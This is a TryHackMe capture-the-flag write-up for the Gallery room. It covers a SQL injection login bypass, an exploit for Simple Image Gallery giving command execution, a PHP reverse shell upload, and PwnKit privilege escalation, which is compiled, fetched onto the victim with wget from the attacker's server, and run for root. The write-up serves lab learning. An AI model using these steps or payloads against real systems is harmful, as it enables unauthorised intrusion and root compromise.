# Tryhackme Gallery Room Writeup
  - Penetration Testing methodology
    - Scanning
      - Nmap Scan
    - Enumeration
      - Enumerating HTTP Service
      - Searching Exploit
      - Testing Login page
    - Exploitation
      - Reading exploit code
      - Trying exploit code
      - Finding another way to exploit cms
      - Uploading shell
    - Privilege Escalation
      - Enumerating kernel make
      - Searching Exploit
      - Compiling exploit
      - Transferring Binary
      - Getting Root Shell 
      - Getting Answers
  
  - Walkthrough
    - There are two flags to find in this room 1. User flag 2. Root flag
    - Scanning IP with Nmap we get following output
       ![1  Initialscanning](https://user-images.githubusercontent.com/75413146/153704382-d698aafd-0acd-4667-8d80-7eacdf409ee2.png)
      
      We can see that on port 80 and on port 8080 http service is running, By visiting to the IP:Port we can see that on port 8080 we see
        ![2  Visiting Simple Gallery Page](https://user-images.githubusercontent.com/75413146/153704486-a9180690-64ce-4a5c-ba51-31b2f9b857f9.png)
       I tried a payload of SQLi in Username : " ' or 1=1 -- " & Password : " a " but didn't worked.
        ![6  Running SQLi](https://user-images.githubusercontent.com/75413146/153704999-70b40ef8-a327-4027-8471-f8bbd85f7479.png)

      
      So the CMS is Simple Image Gallery after searching it for on searchsploit we get following output
        ![3  Searching Exploits](https://user-images.githubusercontent.com/75413146/153704567-3cfa0a88-6b6e-4b3b-a568-f7f4affb15f9.png)
      
      Copying the exploit to current directory.
        ![4  Copying exploit](https://user-images.githubusercontent.com/75413146/153704594-d69b866e-b8e5-47c1-8cd1-4f7417342785.png)
      
      # It's a good practice to read exploit. Even if you don't understand try to read some parts of it what and how it's doing. [ My Takeaway ]
      Before finding something i ran the code to check how the exploit works.
        ![5 4 Running Exploit](https://user-images.githubusercontent.com/75413146/153704677-b735eee4-ff08-427a-bb6b-96efaa237306.png)
      
      So the code was allowing us to execute commands via a parameter called cmd and it was uploaded in gallery/uploads directory. So i visited on the provided url and found that the code was executing. The output of whoami command.
        ![5 5 Running Exploit](https://user-images.githubusercontent.com/75413146/153704746-b20aaa41-24eb-4a83-ac47-446c4d5023e6.png)

      AFter a lot of tries to gain reverse shell through cmd parameter i was frustrated then in a try i read the code [ My Takeaway :D ] content as follows:
        ![5 1 Reading Exploit](https://user-images.githubusercontent.com/75413146/153704804-a53cb4c2-44d6-4ab8-b106-8cc1185751f9.png)
        ![5 2 Reading Exploit](https://user-images.githubusercontent.com/75413146/153704810-417bd80d-50a7-4d49-a4c9-9e0bfb3872ff.png)
        ![5 3 Reading Exploit](https://user-images.githubusercontent.com/75413146/153704800-f77a91f3-2e6f-4e4c-9c50-275d8a458ff8.png)
      
      While reading i encountered a line which seemed to me a SQLi payload see below :
        ![6  Reading Exploit](https://user-images.githubusercontent.com/75413146/153704955-8d4adc85-5e28-4e9e-9451-e9dded0f8310.png)
      
      So i got a hint that the payload which i was trying to use was not working for this room so i tried the payload which was used in exploit.
        ![6  Running simple cms exploit sqli payload](https://user-images.githubusercontent.com/75413146/153705095-858cd49c-0e39-474f-9db9-42d53c81adf5.png)
       And boooom !! i was not expecting this but it worked...
        ![7  We r in](https://user-images.githubusercontent.com/75413146/153705113-9e1847a3-3a5e-474f-a3cc-db6d6d9106fc.png)
       
       OKK !! We are in so now while walking an application i found a page " Albums " So after visiting i saw upload functionality.
        ![7 1 moving](https://user-images.githubusercontent.com/75413146/153705192-774e205e-dbc9-4382-bd2f-bec004592da2.png)

       I thought let's give it a try to upload a PHP reverse shell by Pentest Monkey ( can be found in /usr/share/webshells/php/ or can be found on google coz it's famous revershell script so will be easy to find ). 
       
       So edited my reverse shell with my IP and my favorite port
        ![6  3 Editing shell IP](https://user-images.githubusercontent.com/75413146/153705281-c31231ce-9b1a-4304-9b27-c9a443c1f54a.png)
       BTW out-of-topic : I am using 1337 coz not of i am leet but i want to be leet XD #HECKUR MINDSET
       
       Uploading the PHP Reverse Shell and listening on localhost via nc -lvnp 1337 [ for me it's 1337 you use what you typed the port to in script ]
        ![7 2 Upload shellcode](https://user-images.githubusercontent.com/75413146/153705349-6173c59a-3551-42d8-8a3e-edcd6d32d468.png)
        
       Shell Uploaded successfully !!!!
         ![7 3 Shell uploaded](https://user-images.githubusercontent.com/75413146/153705426-d93f1a53-2e47-4554-baa8-e7b0a1bba390.png)
         
       By clicking on the script you uploaded you can activate the shell. But don't forget to listen before you activated the shell.
        ![9 got shell](https://user-images.githubusercontent.com/75413146/153705457-65d471d2-b5ee-472c-b64d-a9f493d78b4e.png)
        
      Whoop Whoop we got shell... OKKK first things first let's stabilise our shell. I learned stabilising from What the Shell room on Tryhackme.
      - export TERM=xterm
      - which python3 [ Will allow to know what python is installed ]
      - python3 -c 'import pty;pty.spawn("/bin/bash")'
      - press CTRL+Z to bcakground the shell and also run the command on attacker machine
      - stty raw -echo ; fg
      - reset
      - [ This commands will give us a fully functional shell ]
        ![9 1 Stabilising shell](https://user-images.githubusercontent.com/75413146/153705566-476dfb91-8360-49e3-8670-4435c3b80777.png)
      By resetting you get your shell reset like below a clean shell :D
  - Privilege Escalation TIIIIIIIIIIIME !!!!
      - For privesc you can run linpeas or any other script or may enumerate manually for escalation.
      - But in this writeup we will run PwnKit to learn some new about POLKIT pkexec module exploit. The exploit code can be found here -> https://github.com/ly4k/PwnKit/blob/main/PwnKit.c 
        ![10  enumerating privesc](https://user-images.githubusercontent.com/75413146/153705878-b9531579-e336-44f6-bc6f-a5f328428b81.png)
      - Let's do this...
      Compiling the code by 
      - gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
         ![11  1 pkexec binary](https://user-images.githubusercontent.com/75413146/153705895-3944080b-9a45-4fda-ab70-b09be5dc796c.png)
        We got the binary compiled and now let's move this to victim host.
        - 1st host a server on attacker machine we can do this by [Note : Host the server where your binary file is ! ]
          - Command : python3 -m http.server 80
        - 2nd  Go to victim terminal and download the binary by following 
          - Command : wget http://[attackerIP:PORT]/file_name
            ![12  Tranferring binary](https://user-images.githubusercontent.com/75413146/153705932-8b8fc8a4-8b4c-4c3b-bd0a-c459c21fbfc6.png)
            
            Also note the workding directory i am in /dev/shm. You must have a writable permission on a directory. Like /tmp or /dev/shm or /var/tmp
            Now we got the binary so let's make it executable by using command : 
              - chmod +x PwnKit
        Let's now run the binary 
          ![13  Got Shell](https://user-images.githubusercontent.com/75413146/153706089-1213c008-3b53-42d1-b140-c7ccdd2a82d2.png)
        
        Controlling Emotions of getting root shell ;-;
          So let's get the flags and end it ASAP.
          - /home/mike has user.txt
          - /root/ has root.txt
            ![13  Flags txt](https://user-images.githubusercontent.com/75413146/153706142-3bab8ddf-4894-42aa-8841-063eefd5e45d.png)
        Also we need hash of an admin user to complete the room
          - Use command netstat -altuopn for checking the services runnning on localhost
          - We can see 3306 is running which is mysql port.
          - Using mysql -u root -p [use password as root]
          - accessing the database.
          - and we got the admin hash submitting it and ok the room has been completed.
            ![14  databases](https://user-images.githubusercontent.com/75413146/153706239-3c34e211-ac40-44b8-bea1-97ed28ac16e1.png)
            ![14 2 databases](https://user-images.githubusercontent.com/75413146/153706246-a4230f42-9b67-4820-895e-dd7e3d34aec5.png)
            ![14 3 database hash](https://user-images.githubusercontent.com/75413146/153706249-57ca5fea-01e4-4fc7-88a2-1ef0184433f2.png)

# If any suggestions please advice.
